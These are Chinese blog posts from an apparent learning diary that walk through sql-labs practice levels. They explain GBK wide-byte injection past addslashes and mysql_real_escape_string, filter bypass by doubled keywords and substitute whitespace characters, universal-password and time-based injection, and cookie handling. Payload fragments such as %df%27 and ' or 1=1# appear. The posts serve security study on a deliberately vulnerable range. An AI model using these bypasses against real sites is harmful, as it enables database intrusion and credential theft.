还有php字符串中一个反斜杠应该写成’\\’，将一个反斜杠加以转义，使其成为真正意义上的反斜杠而不是转义字符 所以首先检查字符串，如果其中有一个反斜杠，就将其替换成三个反斜杠，不要纠结为什么是三个，这是官方文档的规定，简单来说就是我们输入一个反斜杠时将这个反斜杠转义就是了 第二次检查字符串中如果有’则被替换成\\’，就是将单引号转义 第三次就是将双引号转义 所以对我们输入的单引号，反斜杠和双引号进行了转义 这个函数的作用就是设置mysql的set-character-client 和 set-character-connection 和 Set-character-results三个参数的值设置为gbk编码 很容易联想到宽字节注入 我们在客户端输入id的值后，经过php服务器提交给mysql，mysql将接受的数据经过set-character-client的编码方式进行编码，再用set-character-connection的编码方式进行编码，然后进入数据库和数据表，根据库和表的默认编码方式进行编码，再将查询结果根据set-character-results编码返回给客户端 而gbk编码方式会将字符串中的两个字符看作是一个汉字，前提是前一个字符的ascii码大于128，所以我们输入id=%df%27时，经由过滤变成’%df%5c%27’，然后经过mysql的编码，认为%df%5c是一个汉字，从而造成单引号不被转义，造成前面单引号不闭合，从而注入 所以只要解决单引号被转义的问题，就与前面关卡没什么区别了 下面爆库 爆表 爆列 这里注意如果输入table_name=’users’，单引号会被转义，可以把users转成十六进制，从而避免使用单引号 延时注入 报错注入 Less-33这关与上一关区别在于使用了addslashes这个函数 这个函数可以将单引号，双引号和反斜杠转义 实际上与上一关功能相同，只不过这个函数可以实现上一关的三个替换功能 一样在单引号前面加上%df即可正常注入 Less-34这关用了POST提交表单的方法，依然对单引号，双引号和反斜杠有转义 查询语句如下： 与之前关卡区别在于，之前是GET方式提交的请求，而我们输入的GET参数是会经过url解码的，而POST则不会经过url解码，所以我们如果按照之前的方法输入username=admin%df’，发现%df不会被解码 所以不如我们替它解码，%df经过url解码后为字符�，所以我们可以输入admin�’ 果然有报错了 那么接下来又思考如何注出用户名和密码，因为username列的数据类型是字符串，不像是之前关卡id列的数据类型是整型，所以此处我们用万能密码 Username=�’ or 1=1# 发现成功注出了用户名和密码 结合查询语句 Select * from users where username=’’ and password=’’ limit 0,1 Select * from users where username=’ �\\’ or 1=1 Gbk编码将�和\\看做一个汉字，or语句逻辑运算，因为1=1恒为1所以条件恒为真，注出users表中所有用户名和密码 在mysql命令行验证一下 那么要注出下面几行的用户名和密码我们只需要加个limit n,1就ok了 其他注入和之前一样 爆库 爆表 爆列 报错注入 这里如果用and会导致前面为假而后面不执行，所以改成or 延时注入 关于延时注入，之前碰到的都是能前面id=某个数字能查到，然后根据某个判断条件执行sleep进行延时注入 而本关注入点username数据类型是字符串，也就是说必须跟列下数据完全一样，才能查的到值，而本关我们要注入，则必须要过滤转义字符从而使单引号逃逸，也就是我们过滤后username的值肯定不可能跟表里的值有相同的，即不能保证前面的值为真，要延时注入，就得用or sleep，or的执行条件前面为前面的条件为假 先查一下users表中又十四行数据 那我们进行延时注入 可见sleep了14秒，因为mysql要对每行数据进行查询，判断username有没有等于1的，如果没有，则执行sleep 1秒，总共要查询14行，14行都没有符合的，所以sleep了总共14秒 而如果是and的话，则是查询到数据才会执行sleep 1秒 在看看之前的过滤单引号的关卡构造闭合单引号的注入语句 为什么能查出所有数据 我觉得应该这样划分(username=‘admin’ and sleep(5)) or ‘1’=’1’，先查有没有等于admin的，如果没有不执行sleep，然后会执行or，执行结果为1. 如果有等于admin的，则执行sleep，但在要执行时，执行了or语句，结果1,不延迟 所以最终结果不管username的值有没有出现在表中，结果都为1，不会执行sleep 要进行注入的话，就必须将or换成and 所以本关延迟注入如图 Less-35试一下id=1%df’%23 发现报错 说明id没有任何包裹，所以本关也不需要宽字节注入，相当于之前的关卡了 Less-36这关跟之前区别在于转义函数用了mysql_real_escape_string() 但由于我们set names gbk，所以还是能用宽字节注入的方法，跟之前关卡一样 下面总结一下再使用addslashes和mysql_real_escape_string如何防御宽字节注入 Less-37 跟之前post关卡一样，只是用了mysql_real_escape_string HTTP参数污染参考链接：http://www.freebuf.com/articles/web/5908.html 宽字节注入参考链接：https://mp.weixin.qq.com/s/WjGaDxwaBkOzCe2BWGak2A","categories":[{"name":"sql-labs","slug":"sql-labs","permalink":"https://Foxgrin.github.io/categories/sql-labs/"}],"tags":[{"name":"sql","slug":"sql","permalink":"https://Foxgrin.github.io/tags/sql/"}]},{"title":"sql-labs23-28","slug":"sql-labs23-28","date":"2018-07-09T05:31:00.000Z","updated":"2018-07-09T13:33:44.950Z","comments":true,"path":"/posts/38551/","link":"","permalink":"https://Foxgrin.github.io/posts/38551/","excerpt":"总结一些sql-labs中带有过滤关键字的关卡","text":"总结一些sql-labs中带有过滤关键字的关卡 Less23-28Less-23 这关对注释符–+和#有过滤 因为id被单引号包裹 解决方法是通过构造payload来闭合单引号 爆数据库 爆表 爆列 如果采取报错注入的话，还有一种方法是通过or ‘1’=’1闭合单引号 如果用count(),group by,floor(rand(0)2)则要用and ‘1’=’1才会报错 延时注入 此处如果用or ‘1’=’1的话会导致后面恒为真，导致前面的sleep不被执行，所以应当换成and ‘1’=’1 Less-25从源代码可以分析出对关键字or 和and有过滤，并且不区分大小写 由于只过滤一次，所以可以用复写关键字的方法注入关键字or和and 爆数据库 爆表 爆列 延时注入 报错注入 Less-25a这关没有报出错误信息，所以考虑用延时注入 看出id没有被引号包裹 Less-26 从源代码分析出过滤了关键字and,or,/*,–,#,空格,/ 解决方法:(1)双写and 和 or ​ (2)使用or ‘1’=’1 闭合单引号 ​ (3) %09 TAB键（水平） ​ %0a 新建一行 ​ %0b TAB键（垂直） ​ %0c 新的一页 ​ %0d return功能 ​ %a0 空格 替代空格，但经过尝试，window下以上所有字符都替代不了空格，迫于无奈只好将源码中过滤空格的语句注释 延时注入 报错注入 联合注入 Less-26a这题没有报错信息，其余与上题一致 延时注入 看出id被(‘’)包裹 因为没有报错信息，所以无法用报错注入 于是用联合注入 爆库 爆表 爆列 Less-27 这关对关键字union和select有过滤 复写union，三写select或者大小写混合即可解决 这里id被单引号包裹 爆库 爆表 爆列 Less-27a这关没有报错信息，输入id=1’ 输入正确结果，因为id为int类型，所以说明id可能被双引号包裹 输入id=1” 查询不到结果，说明被双引号包裹 这关跟上一关一样，对关键字union和select进行了过滤，因为没有报错信息，所以不能用报错注入 联合注入 Less-28 Id被(‘’)包裹，这关没有报错信息，所以用联合注入 发现union和select 同时使用时就会被过滤掉，而且无视大小写 这里解决方法是复写union\\sselect Less-28a 这关只对union\\sselect进行了过滤，无报错信息 复写+联合注入就解决了","categories":[{"name":"sql-labs","slug":"sql-labs","permalink":"https://Foxgrin.github.io/categories/sql-labs/"}],"tags":[{"name":"sql","slug":"sql","permalink":"https://Foxgrin.github.io/tags/sql/"}]},{"title":"sql-labs20","slug":"sql-labs20","date":"2018-07-08T12:17:00.000Z","updated":"2018-07-09T13:33:44.948Z","comments":true,"path":"/posts/47662/","link":"","permalink":"https://Foxgrin.github.io/posts/47662/","excerpt":"sql-labs20通关记录","text":"sql-labs20通关记录 Less-20今天的靶场是Less-20,这关涉及cookie,要深入理解的话我们就一行行分析源代码 首先，来到程序的第一个分支点，$_COOKIE这个变量是能获取到报文头部所包含的cookie字段其中的信息，我们可以分析出如果要执行这个if语句，则cookie的’uname’字段中是没有信息的。 那么网页首先显示的是跟前几个关卡相似的登录页面。接下来来到第一个分支点里的又一个分支点 可以看出当我们在网页中的表单中提交用户名和账号信息时，则开始执行这个if语句 就开始查询数据库里的用户名和密码信息 并且将查询结果的’username’字段中的用户名信息赋值给$cookee 如果查询结果不为空 则设置将cookie中设置名为’uname’的字段，并给该字段赋值$cookee变量的值，也就是之前查询到的用户名信息，并且设置该字段的生存时间如果查询结果为空，则返回一个查询失败的信息 也就是说当我们在网页的表单中输入用户名和密码时，当查询结果不为空时，则在cookie中设置字段值我们用burp抓包看看报文的详细信息 我们先查询一下users表里的信息 接着输入一个users表中存在的用户名和密码 这是我们提交表单给服务器的POST报文，来看看服务器这时返回的信息是什么 可以看出服务器设置了cookie信息 并且返回这些信息，可见这就是一开始的登录页面加上 查询结果后返回的信息那么我们放行这个请求报文，看看接下来发生什么 放行后出现了第二个请求报文，这是个GET请求报文，我们可以看出此时头部已经有了cookie信息，我们再来看看服务器的回应 我们再回头看看源代码，发现此时执行了第二个节点，此时cookie中的’uname’字段已经有了信息，则执行了else语句这个else语句中又包含了一个节点 也就是当我们还未点击submit按钮时会执行这个if语句 然后 返回一些信息 并且以cookee变量的值作为用户名进行数据库的查询然后将查询到的信息输出出来，最后一行会出现一个submit按钮接下来我们放行第二个报文 放行后可以看到网页发生了变化，也就是返回了还未提交submit时的信息我们点击一下submit按钮，这时看看请求的报文格式 可以看出这是一个POST请求报文，这时还又cookie信息，我们再来看看服务器返回的报文 这时服务器发现cookie中的’expires’字段中的时间发生了变化，’uname’字段内容为空时，默认内容为deleted，并且返回 可见当我们点击submit按钮后执行了else语句 放行这个POST请求报文 又出现了一个GET请求报文，看出此时cookie信息已经被删除了 又回到了一开始的登录界面这里就涉及了一个重定向“location”它的作用是不用用户输入网址，它会自动访问，一般是GET请求，所以我们之前能抓到两个请求报文，且网页最后显示是重定向后的最终页面","categories":[{"name":"sql-labs","slug":"sql-labs","permalink":"https://Foxgrin.github.io/categories/sql-labs/"}],"tags":[{"name":"sql","slug":"sql","permalink":"https://Foxgrin.github.io/tags/sql/"}]},{"title":"sql-labs17","slug":"sql-labs17","date":"2018-07-08T12:06:00.000Z","updated":"2018-07-09T13:33:44.947Z","comments":true,"path":"/posts/34927/","link":"","permalink":"https://Foxgrin.github.io/posts/34927/","excerpt":"sql-labs17通关记录","text":"sql-labs17通关记录 Less-17 首先了解到本关是可以改密码，看一下源代码 同样是接收我们输入的username和password，但是这里定义了一个check_input函数 一步步分析这个函数 首先empty这个函数，如果输入值不为空，则返回是false，输入为空，返回true 我们输入的是一个字符串，判断为空的情况的字符串为“”和“0”，所以要执行if语句，则empty返回false，所以输入字符串不为“”和“0”时，截取字符串前十五位 这两个if语句就起到了对输入特殊字符的转义的作用，get_magic_quotes_gpc()这个函数当系统有对特定字符转义时返回true，没有返回false，当有转义时，执行if语句，stripslashes()函数将转义字符丢弃，ctype_digit()函数判断当字符串值不为0或者正整数时返回false，则会将输入的字符串加上’’并且对特殊字符转义 我们首先先输入两个admin，可以看到提示修改密码成功，再看一下result.txt里面输入的值 可以发现我们输入admin这个字符串两边被加了单引号，我们试试用户名admin’ 提示错误，说明查询结果为空，从txt文件可以看到 对我们输入的’进行了转义，说明username无法进行一个注入，我们再试着在用户名输入0 发现修改成功 从txt文件 看出输入字符串为0所以没有加单引号所以这题的注入点应该是password，我们先试试 果然出现了报错信息 没有报错，说明password被单引号包裹,我们来试试基于报错型的注入 结果显示 再试试基于时间的报错型注入 按理来说应该会sleep 13秒，因为没有指定修改条件，会一行行的修改，而users表里有十三行，所以修改十三次。 但从结果来看并没有sleep 这是为什么呢，这个问题我也想了好久好久，最终学长点醒了我，原来是and的优先级大于=，所以先执行’admin’ and if()语句，而字符串里没有数字时是无法做and运算的，就无法执行后面的if语句 我们试着把密码加一个数字 果然结果sleep了13秒，学长建议通过where后的条件进行注入以免意外的错误 于是我们开始爆表名 爆列名 爆数据","categories":[{"name":"sql-labs","slug":"sql-labs","permalink":"https://Foxgrin.github.io/categories/sql-labs/"}],"tags":[{"name":"sql","slug":"sql","permalink":"https://Foxgrin.github.io/tags/sql/"}]},{"title":"sql-labs14","slug":"sql-labs14","date":"2018-07-06T17:49:00.000Z","updated":"2018-07-10T10:04:16.839Z","comments":true,"path":"/posts/35119/","link":"","permalink":"https://Foxgrin.github.io/posts/35119/","excerpt":"以Less-14为例总结一下什么情况会报错或返回查询结果为空","text":"以Less-14为例总结一下什么情况会报错或返回查询结果为空 Less-14部分源代码： 今天总结一下什么情况下会报错，或者查询不到信息，靶场采取sql-labs-less14 可见明显有报错信息，改一下payload 发现这时候虽然登录失败，但是没有报错信息，原因是因为username被双引号包裹，而我们输入’#，系统会认为这个单引号是字符，而前面的双引号没有被闭合，所以一直没有查询结果，自然也不会报错 再改一下 发现没有报错信息，但是登录失败，原因是因为password=0这列不存在，所以查询结果为空，登录失败 再改一下 发现系统睡5秒后提示登录失败，也没有报错信息，发现虽然username虽然是存在的，但是因为系统睡了5秒，查询结果为空 所以，只要为空就一定会登录失败","categories":[{"name":"sql-labs","slug":"sql-labs","permalink":"https://Foxgrin.github.io/categories/sql-labs/"}],"tags":[{"name":"sql","slug":"sql","permalink":"https://Foxgrin.github.io/tags/sql/"}]}]}